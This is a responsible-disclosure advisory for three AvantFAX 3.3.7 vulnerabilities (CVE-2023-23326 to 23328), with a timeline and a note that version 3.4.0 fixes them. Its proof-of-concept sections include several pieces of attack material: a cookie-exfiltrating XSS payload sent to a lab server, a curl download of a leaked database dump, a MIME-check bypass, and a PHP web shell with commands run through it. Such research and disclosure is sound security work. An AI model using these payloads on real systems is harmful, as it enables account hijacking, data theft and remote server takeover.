# Multiple Vulnerabilities in AvantFAX 3.3.7

AvantFAX is an open-source PHP web application designed for managing and sending faxes over the Internet. Users can send and receive faxes using a virtual fax machine connected to a server equipped with a fax modem, or fax server. 

On November 2022, a researcher from [Cycura's](https://www.cycura.com) offensive security research team discovered three vulnerabilities affecting AvantFAX 3.3.7. Exploitation of these vulnerabilities may lead to administrator account takeover, sensitive information disclosure, and remote code execution.
 
1. [CVE-2023-23326](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23326): Session Hijacking via Authenticated Stored Cross-Site Scripting 
1. [CVE-2023-23327](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23327): Unauthenticated Access to AvantFAX Backup Fax Archive and Database 
1. [CVE-2023-23328](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23328): Remote Code Execution via PHP Arbitrary File Upload 

Earlier releases of AvantFAX may also be affected by these vulnerabilities. 

## Credit

The vulnerabilities were discovered by Cycura cyber security researcher [Harold Rodriguez](https://www.linkedin.com/in/haroldrodriguez/). 

## Acknowledgement

Cycura would like to thank the AvantFAX team for their prompt acknowledgement of our report and willingness to work collaboratively to remediate the vulnerabilities. It is encouraging to see a company that takes cybersecurity seriously, and is committed to continuously improving their security practices. 

## Disclosure Timeline

* November 11, 2022: 
    * Discovered three vulnerabilities affecting AvantFAX 3.3.7. 
* November 22, 2022: 
    * Notified AvantFAX of the vulnerabilities and intent to publish our findings in accordance with our 90-day disclosure timeline policy. 
    * AvantFAX acknowledged vulnerability report. 
* January 10, 2023: 
    * AvantFAX provided us with an updated release that addresses the vulnerabilities. 
    * Requested CVEs from MITRE for the three vulnerabilities. 
* January 11, 2023: 
    * Verified that the updated release remediates the vulnerabilities. 
* February 13, 2023: 
    * Received CVE IDs for the three vulnerabilities.
	* Notified AvantFAX that the updates remediated the vulnerabilities and our intent to proceed with public disclosure after February 21, 2023.
* February 21, 2023: 
    * AvantFAX releases version 3.4.0 which remediates the vulnerabilities.

## Remediation

The AvantFAX team has remediated these issues in AvantFAX 3.4.0. It is strongly recommended that users upgrade to the latest release available at [http://www.avantfax.com/](http://www.avantfax.com/). 

## CVE-2023-23326: Session Hijacking via Authenticated Stored Cross-Site Scripting

### Vulnerability Description 

AvantFAX is vulnerable to Stored Cross-Site Scripting (XSS) in the user's email address field. An authenticated low privilege user account can exploit this vulnerability to steal an administrator's session cookie and hijack their session. When an administrator logs in to the /admin page, the XSS payload is executed immediately upon loading the admin dashboard.  

 
### Proof of Concept 

Host the following Javascript file x.js on a server we control; for example, 192.168.225.132. 

```
var x = new Image; 
x.src = 'http://192.168.225.132/cookie=' + document.cookie; 
```

Authenticate to AvantFAX as a low privilege user, and set the user's email address to the following: 
```
<script src="http://192.168.225.132/x.js"></script>
```

Save the changes, and log out. 

Login as an administrator user. The dashboard will immediately load and execute the contents of x.js, which sends the administrator's session cookie to our server. 

This can be verified by looking at the contents of our HTTP server logs and observing the administrator's session cookie: 

```
192.168.225.1 - - [16/Nov/2022:15:47:28 -0500] "GET /x.js HTTP/1.1" 200 79 "http://192.168.225.131/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0" 
192.168.225.1 - - [16/Nov/2022:15:47:28 -0500] "GET /cookie=AvantFAX=p4vvvp0tnesmao009u0l6lo422 HTTP/1.1" 404 125 "http://192.168.225.131/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0" 
```

  
## CVE-2023-23327: Unauthenticated Access to AvantFAX Backup Fax Archive and Database 
  
### Vulnerability Description 

Administrators can create and download a backup of the sent and received faxes, as well as the contents of the avantfax database. These files are stored in /avantfax/tmp with predictable names:  

```
avantfax-archive-YYYYMMDD.tar.gz 
avantfax-schema-YYYYMMDD.tar.gz 
```

The code responsible for creating the file names can be found in admin/system_func.php:  

```
} elseif ($formdata->download_ar) { 
		// download fax archive 
		$basname        = "avantfax-archive-".date ("Ymd").".tar.gz"; 
		$tmpfile        = $TMPDIR.$basname; 
		system ("tar -czf $tmpfile $ARCHIVE $ARCHIVE_SENT"); 
		header ("Location: ../tmp/$basname"); 
		exit; 
} elseif ($formdata->download_db) { 
		// download fax database dump 
		$basname        = "avantfax-schema-".date ("Ymd").".sql.gz"; 
		$tmpfile        = $TMPDIR.$basname; 
		system ("mysqldump --user=".AFDB_USER." --password=".AFDB_PASS." ".AFDB_NAME." | gzip -9 > $tmpfile"); 
		header ("Location: ../tmp/$basname"); 
		exit; 
} 
```
 
Due to its predictable naming convention, it is trivial for a user to brute force a range of dates and download these files. The archive files contain faxes that have been sent and received, and the schema files contain user accounts and their MD5 hashed passwords.  

### Proof of Concept 

Login as an administrator, go to the Systems Functions page and click on the Download Archive and Download Database buttons. These will create the avantfax-archive and avantfax-schema files appended with the current date in YYYYMMDD format.  

Download the files as an unauthenticated user:   

```
$ curl -s http://192.168.225.131/tmp/avantfax-schema-20221116.sql.gz | gunzip | grep 'INSERT INTO `UserAccount`' 

INSERT INTO `UserAccount` VALUES (1,'AvantFAX Admin','admin','d1a714af4e450a88cb6eba85fdd93344','root@localhost','','','','','','',0,0,0,1,0,'2022-11-15 18:00:26','2022-11-16 18:57:07','192.168.225.1','en','','','','0000-00-00',0,0,1,0,1,0,1),(2,'Koji','koji','d1a714af4e450a88cb6eba85fdd93344','koji@test.local','','','','','','',2,25,30,0,0,'2022-11-16 16:04:40','2022-11-16 18:00:14','192.168.225.1','en','','','','0000-00-00',0,0,0,0,1,0,0); 
```
  

## CVE-2023-23328: Remote Code Execution via PHP Arbitrary File Upload 

### Vulnerability Description 
 
AvantFAX does not properly validate uploaded files, which allows an authenticated user to upload PHP files with arbitrary code resulting in remote code execution.  

The Send Fax page allows a user to upload documents to be faxed. File types are restricted to Postscript (.ps), PDF (.pdf), TIFF (.tiff), and text (.txt). Attempting to upload a PHP file called test.php with the following contents results in the application rejecting it:   

```
<?php 
print("Test"); 
?> 
```

The user is presented with an error "File type is unauthorized (text/x-php)".  

File type verification is performed using PHP’s mime_content_type() function which checks the contents of the file to determine its type. This check is done within the load_file() function in includes/FileUpload.php: 

```
// check mimetype  
if (function_exists('mime_content_type')) {  
		$this->mimetype = mime_content_type($this->tmpname);  
} elseif (extension_loaded('fileinfo')) {  
		$minfo = new finfo(FILEINFO_MIME);  
		$this->mimetype = $minfo->file($this->tmpname);  
} else {  
		$this->mimetype = $file['type'];  
} 
```

When mime_content_type() checks test.php, it returns text/x-php. Since this is not in the allowed list of file types, the application returns a "File type is unauthorized" error.  

However, if the contents were changed to include arbitrary text right before the <?php tag, the application accepts it:  
  

```
This line bypasses the file-type check. 
<?php 
print("Test"); 
?> 
```

This is because mime_content_type() returns text/plain which is an allowed file type. 

Furthermore, the application does not check for file extensions, and accepts files that have a .php extension. This allows a user to upload PHP files containing arbitrary code that is executed when loaded.  

The uploaded file is saved in /avantfax/tmp with 9 hexadecimal characters prepended to the file name. For example, our uploaded test.php file could be saved as ac0f129d8test.php. 

The 9-character hexadecimal string is generated by the set_randname() function in includes/FileUpload.php. However, this isn't actually random and is instead generated by taking the current time stamp, hashing it using MD5, and then taking the first 9 characters of that MD5 hash:   

```
$this->filename = substr(md5(microtime()), 0, $n).$this->filename; 
```
  
This allows us to predict possible 9-character hexadecimal strings if we know the time on the server, and then perform a brute force attack to try and find the name of the uploaded file. There are no access controls to protect the /avantfax/tmp directory, which allows unauthenticated users to load the PHP file and execute its contents once they have discovered its file name.  

### Proof of Concept 
 
We developed a PHP script to automate the exploitation process. It uploads a web shell to the server and records a time stamp of when the upload is completed. An arbitrary number is subtracted from the time stamp to establish a time period in the hope that one of those time stamps in that range will match the time stamp set_randname() used to generate the file name.  

In our test environment, subtracting 15,000 milliseconds from the time stamp provided a large enough range to cover the time stamp used by set_randname().  

Each time stamp is hashed using MD5, and the first 9 characters of the hash are prepended to the file name of our web shell. A request is made to the server for the updated file name, and if the web server returns a 200 HTTP response code, then we have found the web shell. 

In this particular instance, it took approximately 40 seconds for the script to find the web shell on the server:  
 
```
$ time php -e af_pwn.php 
[+] Target: 192.168.225.131 
[+] Payload: 

This line bypasses the file-type check. 
<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> 

[+] Uploading payload... 
[+] Upload completed at: 0.28506400 1668789238 
[+] Searching for webshell... 
[+] Using time period 285064 to 270064 
[+] Found webshell at http://192.168.225.131/tmp/e7ba68bcbtest.php 
[+] Exploit using http://192.168.225.131/tmp/e7ba68bcbtest.php?cmd=id 

real    40.85s 
user    0.52s 
sys     1.66s 
cpu     5% 
```

We are now able to execute commands on the server via the web shell and retrieve the output: 

```
$ curl http://192.168.225.131/tmp/e7ba68bcbtest.php?cmd=id 
This line bypasses the file-type check. 
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0 
  
$ curl http://192.168.225.131/tmp/e7ba68bcbtest.php?cmd=uname+-a 
This line bypasses the file-type check. 
Linux localhost.localdomain 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux  
```
